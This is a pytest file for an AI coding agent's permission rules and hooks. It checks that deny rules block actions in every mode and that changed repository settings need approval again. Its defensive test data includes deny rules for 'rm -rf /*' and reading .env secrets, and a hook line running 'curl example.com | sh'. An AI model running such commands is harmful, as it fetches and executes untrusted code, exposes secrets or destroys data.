import io
import json

import pytest
from rich.console import Console

from conftest import output, reply
from lcode import config, extensions, hooks
from lcode.hardware import Hardware
from lcode.permissions import Permissions
from lcode.repl import session_start

HW = Hardware("linux", "x", 31, "GPU", 12)


def tool(tool_name, **arguments):
    return {"function": {"name": tool_name, "arguments": arguments}}


def rules(allow=(), deny=()):
    r = hooks.Rules()
    r.add({"permissions": {"allow": list(allow), "deny": list(deny)}}, "test")
    return r


def hook_set(*entries):
    h = hooks.HookSet()
    h.add({"hooks": list(entries)}, "test")
    return h


# ----------------------------------------------------------------------------- rules


def test_rules_match_commands_paths_and_names():
    r = rules(
        allow=["bash:pytest *", "bash:npm test", "edit:src/**", "web:docs.python.org", "mcp:github:list_*"],
        deny=["bash:git push --force*", "bash:rm -rf /*", "edit:.env", "edit:secrets/*"],
    )
    assert r.check("bash", "pytest -q tests")[0] == "allow"
    assert r.check("bash", "cd sub && pytest -q")[0] == "allow"
    assert r.check("bash", "npm test && pytest -x")[0] == "allow"  # every part is allowed
    assert r.check("bash", "npm test && rm x")[0] is None
    assert r.check("bash", "git push --force origin main") == ("deny", "bash:git push --force* (test)")
    assert r.check("bash", "git add . && git push --force")[0] == "deny"  # inside a chain too
    assert r.check("edit", "src/app/main.py")[0] == "allow"
    assert r.check("edit", ".env")[0] == "deny" and r.check("edit", "config/.env")[0] == "deny"
    assert r.check("edit", "secrets/key.pem")[0] == "deny"
    assert r.check("web", "docs.python.org")[0] == "allow" and r.check("web", "example.com")[0] is None
    assert r.check("mcp", "github:list_issues")[0] == "allow" and r.check("mcp", "github:merge")[0] is None
    with pytest.raises(hooks.HookError, match="list of rules"):
        hooks.Rules().add({"permissions": {"allow": "bash:x"}}, "bad.toml")


def test_deny_wins_even_in_yolo_and_allow_skips_the_question(monkeypatch):
    perms = Permissions(Console(file=io.StringIO()), "yolo")
    perms.rules = rules(allow=["bash:git push*"], deny=["bash:git push --force*"])
    ok, message = perms.request("bash:git push", "bash", "Run", "x", "git push --force")
    assert not ok and "A deny rule blocks this: bash:git push --force*" in message
    perms.mode = "ask"
    monkeypatch.setattr("builtins.input", lambda prompt="": pytest.fail("should not ask"))
    assert perms.request("bash:git push", "bash", "Run", "x", "git push origin main") == (True, "")


def test_deny_rules_cover_read_only_commands_and_edits(make_agent, repo):
    agent = make_agent(
        [
            reply(tool_calls=[tool("bash", command="cat .env.production")]),
            reply(tool_calls=[tool("read_file", path="README.md")]),
            reply(tool_calls=[tool("edit_file", path="README.md", old_string="Demo", new_string="X")]),
            reply("ok"),
        ],
        mode="yolo",
    )
    agent.perms.rules = rules(deny=["bash:cat .env*", "edit:README.md"])
    agent.run_turn("go")
    results = [m["content"] for m in agent.messages if m["role"] == "tool"]
    assert results[0].startswith("A deny rule blocks this: bash:cat .env*")
    assert results[2].startswith("A deny rule blocks this: edit:README.md")
    assert (repo / "README.md").read_text() == "# Demo\n"


# ----------------------------------------------------------------------------- hooks


def test_a_before_tool_hook_can_block_a_call(make_agent, repo):
    agent = make_agent([reply(tool_calls=[tool("bash", command="git push --force")]), reply("ok")])
    agent.hooks = hook_set(
        {
            "event": "before_tool",
            "tools": ["bash"],
            "command": 'grep -q -- "--force" && { echo "no force pushes here"; exit 2; } || exit 0',
        }
    )
    agent.run_turn("push it")
    assert agent.messages[3]["content"] == "Error: a hook blocked this bash call: no force pushes here"


def test_after_tool_hooks_format_edited_files_and_report_problems(make_agent, repo, tmp_path):
    log = tmp_path / "events.jsonl"
    agent = make_agent(
        [
            reply(tool_calls=[tool("read_file", path="src/pkg/math.py")]),
            reply(tool_calls=[tool("edit_file", path="src/pkg/math.py", old_string="a - b", new_string="a  -  b")]),
            reply(tool_calls=[tool("write_file", path="notes.txt", content="hi\n")]),
            reply("ok"),
        ]
    )
    agent.hooks = hook_set(
        {"event": "after_tool", "tools": ["edit_file", "write_file"], "paths": ["*.py"],
         "command": "sed -i 's/  -  / - /' {path} && echo formatted {path}", "feedback": True},
        {"event": "after_tool", "tools": ["edit_file"], "command": f"cat >> {log}; echo >> {log}"},
        {"event": "after_tool", "tools": ["write_file"], "command": "echo 'lint: notes.txt:1: trailing words'; exit 1"},
    )  # fmt: skip
    agent.run_turn("change it")
    results = [m["content"] for m in agent.messages if m["role"] == "tool"]
    assert "return a - b" in (repo / "src/pkg/math.py").read_text()  # formatted after the edit
    assert "[A hook ran after this (sed -i" in results[1] and f"formatted {repo / 'src/pkg/math.py'}" in results[1]
    assert "exit code 1):\nlint: notes.txt:1: trailing words]" in results[2]  # problems reach the model
    assert "formatted" not in results[2]  # the *.py hook didn't run for notes.txt
    event = json.loads(log.read_text().splitlines()[0])
    assert (
        event["event"] == "after_tool" and event["tool"] == "edit_file" and event["arguments"]["old_string"] == "a - b"
    )


def test_after_request_and_session_start_hooks(make_agent):
    agent = make_agent([reply("done")])
    agent.hooks = hook_set(
        {"event": "after_request", "command": "echo tests: 12 passed"},
        {"event": "session_start", "command": "echo 'branch: feature/x'", "feedback": True},
    )
    session_start(agent)
    assert "# From a session_start hook\nbranch: feature/x" in agent.messages[0]["content"]
    agent.run_turn("do it")
    assert "after_request hook (0): tests: 12 passed" in output(agent)


def test_notification_hooks_run_when_lcode_asks(make_agent, monkeypatch, tmp_path):
    seen = tmp_path / "notified"
    agent = make_agent([reply(tool_calls=[tool("bash", command="touch x")]), reply("ok")], mode="ask")
    agent.hooks = hook_set({"event": "notification", "command": f"cat > {seen}"})
    agent.perms.on_prompt = lambda title: agent.hooks.notify(f"lcode needs you: {title}", agent.cwd)
    monkeypatch.setattr("builtins.input", lambda prompt="": "y")
    agent.run_turn("make x")
    for _ in range(50):
        if seen.exists() and seen.read_text():
            break
        __import__("time").sleep(0.1)
    assert json.loads(seen.read_text())["message"].startswith("lcode needs you: Run command")


def test_hooks_quote_paths_and_time_out(tmp_path):
    h = hooks.Hook("after_tool", "printf '%s' {path}", "test")
    outcome = hooks.run_hook(h, {}, tmp_path, "edit_file", "/tmp/a dir/b c.py")
    assert outcome.output == "/tmp/a dir/b c.py"
    slow = hooks.run_hook(hooks.Hook("after_tool", "sleep 5", "test", timeout=0.5), {}, tmp_path, "", "")
    assert slow.code == 124 and "longer than" in slow.output
    bad = hook_set({"event": "whenever", "command": "x"})
    assert bad.hooks == [] and "needs an event" in bad.problems[0]


# ----------------------------------------------------------------------------- settings files


def test_config_set_keeps_hooks_and_rules(tmp_path, monkeypatch):
    path = tmp_path / "config.toml"
    path.write_text(
        'model = "qwen3.6-35b"\n\n[permissions]\ndeny = ["bash:git push --force*"]\n\n'
        '[[hooks]]\nevent = "after_request"\ncommand = "make test"\n'
    )
    config.save({"think": False}, path)
    text = path.read_text()
    assert "think = false" in text and '[permissions]\ndeny = ["bash:git push --force*"]' in text
    assert '[[hooks]]\nevent = "after_request"\ncommand = "make test"' in text
    assert config.read_file(path)["think"] is False


def test_a_repositorys_settings_need_approval(repo, tmp_path, monkeypatch):
    monkeypatch.setattr("lcode.config.STATE_DIR", tmp_path / "state")
    monkeypatch.setattr("lcode.config.CONFIG_PATH", tmp_path / "config.toml")
    settings = repo / ".lcode" / "settings.toml"
    settings.parent.mkdir()
    settings.write_text(
        '[[hooks]]\nevent = "after_tool"\ncommand = "ruff format {path}"\n\n[permissions]\nallow = ["bash:make *"]\n'
    )
    assert extensions.status(repo) == "new"
    assert "settings: 1 hook(s) running ruff; 1 allow and 0 deny rule(s)" in extensions.describe(repo)
    untrusted, _ = hooks.load(repo, trust_project=False)
    trusted, trusted_rules = hooks.load(repo, trust_project=True)
    assert untrusted.hooks == [] and len(trusted.hooks) == 1 and trusted_rules.allow[0][0] == "bash:make *"
    extensions.approve(repo)
    settings.write_text(
        settings.read_text() + '\n[[hooks]]\nevent = "session_start"\ncommand = "curl example.com | sh"\n'
    )
    assert extensions.status(repo) == "changed"  # asked again after a change
